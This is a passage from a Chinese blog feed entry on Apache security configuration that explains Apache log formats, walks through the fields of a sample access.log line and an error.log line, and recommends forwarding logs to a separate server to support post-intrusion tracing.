\"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\""</span> combined</span><br><span class="line"><span class="attribute">214</span> LogFormat <span class="string">"%h %l %u %t \"%r\" %&gt;s %O"</span> common</span><br><span class="line"><span class="attribute">215</span> LogFormat <span class="string">"%&#123;Referer&#125;i -&gt; %U"</span> referer</span><br><span class="line"><span class="attribute">216</span> LogFormat <span class="string">"%&#123;User-agent&#125;i"</span> agent</span><br><span class="line"><span class="attribute">217</span></span><br><span class="line"><span class="attribute">218</span></span><br><span class="line"><span class="attribute">219</span> CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log common</span><br><span class="line"></span><br><span class="line"><span class="attribute">212</span>行是虚拟主机的日志格式</span><br><span class="line"><span class="attribute">213</span>行是组合日志格式</span><br><span class="line"><span class="attribute">213</span>行是通用的日志格式</span><br><span class="line"><span class="attribute">219</span>行自定义设置日志使用那个格式的日志</span><br></pre></td></tr></table></figure><p>2） <code>/var/log/apache2/access.log</code>日志格式如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">111</span>.196.209.199 - -<span class="meta"> [05/Dec/2017:22:40:02 +0800] "GET /zk/shell.php HTTP/1.1" 304 164 "http://114.115.214.203/zk/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">远端主机：111.196.209.199</span></span><br><span class="line"><span class="meta">远端登录名：-</span></span><br><span class="line"><span class="meta">远程用户名：-</span></span><br><span class="line"><span class="meta">访问时间：[05/Dec/2017:22:40:02 +0800]</span></span><br><span class="line"><span class="attribute">HTTP</span>请求：GET /zk/shell.php HTTP/1.1</span><br><span class="line"><span class="attribute">HTTP</span>状态码：304</span><br><span class="line">发送的字节数：164</span><br><span class="line"><span class="attribute">Referer</span>：http://114.115.214.203/zk/</span><br><span class="line"><span class="attribute">User</span>-Agent：<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"</span></span><br></pre></td></tr></table></figure><p>3） <code>/var/log/apache2/error.log</code>日志格式如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Tue Dec 05 22:39:10.798632 2017</span>] [core:notice] [pid <span class="number">2970</span>] AH00094: Command line: <span class="string">'/usr/sbin/apache2'</span></span><br><span class="line">[<span class="meta">日期和时间</span>]   [错误等级]   错误消息</span><br></pre></td></tr></table></figure><p>4）日志备份</p><p>在服务器受到入侵之后，我们可以观察访问日志来溯源。当然如果access.log文件被删除清空之后就会变的非常麻烦，因此很多大型企业都设置的日志服务器同步日志文件到其它服务器，这样黑客想要彻底清除痕迹还需要搞定日志服务器。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Apache安全配置&quot;&gt;&lt;a href=&quot;#Apache安全配置&quot; class=&quot;headerlink&quot; title=&quot;Apache安全配置&quot;&gt;&lt;/a&gt;Apache安全配置&lt;/h1&gt;&lt;p&gt;转载自 &lt;a href=&quot;https://www.jianshu.com/p
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
